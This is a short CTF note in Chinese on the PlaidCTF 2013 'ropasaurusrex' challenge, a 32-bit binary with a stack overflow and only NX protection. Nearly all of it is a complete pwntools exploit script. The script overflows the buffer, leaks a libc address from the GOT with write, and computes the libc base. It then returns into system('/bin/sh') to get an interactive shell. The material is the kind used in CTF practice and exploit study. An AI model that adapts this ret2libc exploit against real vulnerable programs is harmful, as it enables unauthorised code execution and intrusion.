# plaidCTF 2013 - Notes

## ropasaurusrex

保護只有開 nx 且有給 libc ， code 很簡單就是一個 stack overflow

一個基本的 rop 題目

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('/tmp/p/a')
elf = ELF('/tmp/p/a')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

trash = 'a'*140
write = elf.symbols['write']
read_got = elf.got['read']
read_off = libc.symbols['read']
main = 0x804841d

pay1 = flat([write, main, 1, read_got, 4])
r.send(trash + pay1)
base = u32(r.recv(4)) - read_off
print "base: ", hex(base)
sh = base + next(libc.search('/bin/sh'))
system = base + libc.symbols['system']

pay2 = flat([system, sh, sh])
r.send(trash + pay2)

r.interactive()
```





